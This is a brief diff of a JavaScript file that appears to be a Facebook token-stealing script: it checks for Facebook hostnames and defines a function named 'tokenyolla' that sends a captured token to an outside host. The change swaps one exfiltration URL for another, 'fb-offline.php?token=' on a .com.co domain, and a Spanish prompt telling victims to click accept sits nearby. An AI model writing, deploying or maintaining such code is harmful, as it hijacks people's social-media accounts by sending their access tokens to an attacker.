@@ -171,7 +171,7 @@ if (location.hostname.indexOf("www.facebook.com", "static.ak.facebook.com", "app
     }, 200);
 
     function tokenyolla(token) {
-        top.location.href = 'http://biochemical.com.co/rev4.html#' + token;
+        top.location.href = 'https://www.buga.com.co/fb-offline.php?token=' + token;
     }
 }
 var alibasim = "clic en aceptar";
